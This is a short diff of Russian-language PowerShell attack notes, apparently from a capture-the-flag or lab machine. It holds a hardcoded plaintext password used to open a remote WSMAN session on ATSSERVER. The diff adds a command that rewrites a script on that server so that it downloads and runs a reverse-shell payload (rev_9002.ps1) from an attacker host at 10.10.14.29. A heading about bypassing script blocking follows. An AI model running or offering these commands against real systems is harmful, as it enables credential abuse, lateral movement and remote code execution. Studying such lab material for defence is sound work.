@@ -1,9 +1,16 @@
 # Переход на другой компутер используя WSMAN (POwershell)
 
 $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+
 $cred = New-Object System.Management.Automation.PSCredential("acute\imonks", $pass)
 
 invoke-command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock {Get-command}
+
+---- Замена слова на выражение
+
+invoke-command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { ((cat ..\Desktop\wm.ps1 -Raw) -replace 'Ge
+t-Volume', "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29/rev_9002.ps1')") | sc -path ..\Desktop\wm.ps1}
+
 
 # Обход блокировка скрипта
 
